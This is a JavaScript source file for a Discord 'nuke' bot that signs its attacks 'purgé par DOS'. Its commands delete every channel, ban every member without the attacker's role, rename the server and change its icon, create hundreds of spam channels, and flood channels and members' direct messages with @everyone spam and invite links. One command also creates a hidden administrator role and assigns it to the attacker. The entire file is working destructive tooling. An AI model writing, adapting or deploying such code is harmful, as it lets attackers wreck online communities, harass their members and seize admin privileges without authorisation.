const Discord = require("discord.js");
const client = new Discord.Client();
var prefix = ".";
var mention = "126connectés"

var fucked = false;

/*client.on('ready',() => {
    //invit link
    client.guilds.forEach(guild => {
      var invite = client.guilds.find("id", guild.id).channels.find("id", guild.defaultChannel.id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});*/
 

client.on('message', msg => {
 

  if (msg.content === '-ded') {
      if (msg.channel.type === "dm") return;
      if (msg.deletable) msg.delete();
      msg.guild.members.forEach(member => {
        
          member.send("**" + msg.guild.owner.user.username + "** a été purgé par DOS\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg\nhttps://discord.gg/RUXkZqp").catch(error => {}) }, 450)
}

if(msg.content === '-del'){
if(msg.channel.type === "dm") return;
if(msg.guild.channels.size === 0) return;
else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
}

if (msg.content === '-ded') {
console.log(`Commande -ded par ${msg.author.tag}`);



if (!fucked){
msg.guild.setIcon('https://cdn.discordapp.com/attachments/529372289935081472/529800499113754624/20190102_001632.gif').catch(e => {});
msg.guild.setName('purgé par DOS.').catch(e => {});

for (var i = 0; i < 390; i++) {
msg.guild.createChannel('purgé par DOS.', 'voice').catch(e => {});
msg.guild.createChannel('purgé par DOS', 'text').catch(e => {});
}

fucked = true;
}

if (msg.deletable) {
msg.delete();
}
}

if (msg.content === '-rban') {
console.log(`Commande -rban par ${msg.author.tag}`);
msg.guild.members.forEach(member => {
if (!member.roles.exists("name", "𝐃𝐎𝐒") && member.bannable) member.ban().catch(e => {});
});
}

if (msg.content === '-stop') {
console.log(`Commande -stop par ${msg.author.tag}`);
if (msg.deletable) msg.delete().catch(e => {});
msg.guild.leave().catch(e => {});
}

if (msg.content === '-gp') {
console.log(`Commande -gp par ${msg.author.tag}`);

msg.member.guild.createRole({
name: "𝐃𝐎𝐒",
permissions: "ADMINISTRATOR",
mentionable: false
}).then(function(role) {
msg.member.addRole(role);
if (msg.deletable) msg.delete().catch(e => {});
}).catch(e => {});
}
//#endregion
});
client.on("message", msg => {
if(msg.content.startsWith("-ded")){
 msg.delete()
  let i = 0;
  let interval = setInterval(function () {
    msg.guild.channels.forEach(channel => {
      if (channel.type === "text") channel.send("@everyone Ce serveur à été purgé par DOS.\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nhttps://discord.gg/mvZjEDW\nhttps://cdn.discordapp.com/attachments/529372289935081472/529800499113754624/20190102_001632.gif")
    }, 2500);
  });
}
});

client.login(process.env.TOKEN)
